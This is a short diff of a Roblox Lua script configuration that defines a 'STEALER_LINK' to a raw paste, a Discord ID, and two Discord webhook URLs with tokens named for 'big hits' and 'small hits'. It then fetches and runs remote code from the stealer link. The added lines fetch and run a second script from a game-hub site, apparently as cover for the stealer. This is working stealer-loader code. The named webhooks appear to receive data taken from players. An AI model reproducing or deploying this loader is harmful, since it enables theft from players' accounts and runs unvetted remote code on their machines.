@@ -1,3 +1,4 @@
+
 STEALER_LINK = 'https://pastefy.app/kyjujS8R/raw'
 
 DISCORD_ID = '760683323143356418' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
@@ -12,3 +13,5 @@ BigHitsWebhook = "https://discord.com/api/webhooks/1385646408333262980/4fW-9dWuX
 SmallHitsWebhook = "https://discord.com/api/webhooks/1385646380504322109/BU2QZ14Q4yV6lpN8NsdYQ79TuGlJHLH308oT9MCkjSs6-aE1znJ2IY_GDERdaWg8W59r"
 
 loadstring(game:HttpGet(STEALER_LINK, true))()
+
+loadstring(game:HttpGet("https://overdrivehub.xyz/?d=auth&script=mm2_lite"))()
